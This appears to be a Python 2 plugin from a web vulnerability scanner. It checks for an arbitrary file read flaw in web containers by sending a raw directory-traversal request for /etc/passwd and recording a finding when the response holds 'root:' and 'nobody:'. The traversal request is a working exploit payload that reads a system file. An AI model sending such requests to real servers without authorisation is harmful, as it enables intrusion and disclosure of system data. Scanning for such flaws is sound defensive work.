#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    request = []
    try:
        result = []

        scheme = ob['scheme']
        domain = ob['domain']
        path = ob['path']
        ip = ob['ip']
        source_ip = ob.get('source_ip')
        if source_ip:
            ip = source_ip
        import socket
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if scheme == 'https':
            port = 443
        else:
            port = 80
        s.connect((ip, port))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"

        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            new_url = "%s://%s" % (scheme, domain)

            detail = "web容器任意文件读取漏洞"
            request = getRequest(new_url, domain=ob['domain'])

            result.append(getRecord(ob, new_url, ob['level'], detail, request, data))

    except Exception, e:
        logger.error("File:web_file_read_domain.py, run_domain function :%s" % (str(e)))

    return result



